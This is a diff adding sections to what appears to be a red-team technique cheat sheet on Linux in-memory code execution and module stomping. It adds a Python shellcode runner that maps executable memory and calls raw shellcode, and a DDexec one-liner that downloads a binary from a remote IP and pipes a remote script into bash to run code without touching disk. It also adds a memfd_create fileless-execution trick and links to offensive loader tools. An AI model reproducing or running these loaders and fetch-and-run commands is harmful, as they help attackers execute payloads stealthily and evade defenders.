@@ -75,6 +75,94 @@ $ gcc -o loader loader.c -z execstack
 
 
 
+## Linux In-Memory Code Execution
+
+- [https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)
+
+
+
+### Memory Manipulation with Python
+
+- [https://github.com/jonatanSh/shelf](https://github.com/jonatanSh/shelf)
+- [https://github.com/anvilsecure/ulexecve](https://github.com/anvilsecure/ulexecve)
+
+Convert an ELF to PIC, inject it and run from memory:
+
+```
+$ gcc hello.c -fno-stack-protector -fPIE -fpic -static --entry=main -o hello
+$ python3 -m shelf --input hello
+$ python3 run_sc.py
+```
+
+{% code title="run_sc.py" %}
+```python
+# https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md#Python
+
+from ctypes import (CDLL, c_void_p, c_size_t, c_int, c_long, memmove, CFUNCTYPE, cast, pythonapi)
+from ctypes.util import find_library
+
+PROT_READ = 0x01
+PROT_WRITE = 0x02
+PROT_EXEC = 0x04
+MAP_PRIVATE = 0x02
+MAP_ANONYMOUS = 0x20
+
+with open('hellointel_x64.out.shell', 'rb') as f:
+	sc = f.read()
+
+libc = CDLL(find_library('c'))
+
+mmap = libc.mmap
+mmap.argtypes = [c_void_p, c_size_t, c_int, c_int, c_int, c_size_t]
+mmap.restype = c_void_p
+page_size = pythonapi.getpagesize()
+sc_size = len(sc)
+
+mem_size = page_size * (1 + sc_size / page_size)
+cptr = mmap(0, int(mem_size), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
+
+memmove(cptr, sc, sc_size)
+sc = CFUNCTYPE(c_void_p, c_void_p)
+call_sc = cast(cptr, sc)
+call_sc(None)
+```
+
+
+
+### DDexec
+
+- [https://github.com/arget13/DDexec](https://github.com/arget13/DDexec)
+
+{% embed url="https://youtu.be/MaBurwnrI4s" %}
+
+Run binaries from memory without touching the disk:
+
+```
+$1 base64 /bin/ls -w0 > ls.b64
+$2 curl -sS 10.10.13.37/ls.b64 | bash <(curl -sSL https://github.com/arget13/DDexec/raw/main/ddexec.sh) /bin/NonExistentBinary -la
+```
+
+Another trick to do semi-fileless ELF execution with a pre-created process descriptor:
+
+```
+$ python3 -c 'import os;os.fork()or(os.setsid(),print(f"/proc/{os.getpid()}/fd/{os.memfd_create(str())}"),os.kill(os.getpid(),19))'
+$ cat /usr/bin/date > /proc/1732982/fd/4
+$ /proc/1732982/fd/4
+```
+
+
+
+
+## Module Stomping
+
+- [https://offensivedefence.co.uk/posts/module-stomping/](https://offensivedefence.co.uk/posts/module-stomping/)
+- [https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs](https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs)
+- [https://labs.cognisys.group/posts/Advanced-Module-Stomping-and-Heap-Stack-Encryption/](https://labs.cognisys.group/posts/Advanced-Module-Stomping-and-Heap-Stack-Encryption/)
+- [https://github.com/CognisysGroup/SweetDreams](https://github.com/CognisysGroup/SweetDreams)
+
+
+
+
 ## Function Stomping / Threadless Injection
 
 - [https://idov31.github.io/2022/01/28/function-stomping.html](https://idov31.github.io/2022/01/28/function-stomping.html)
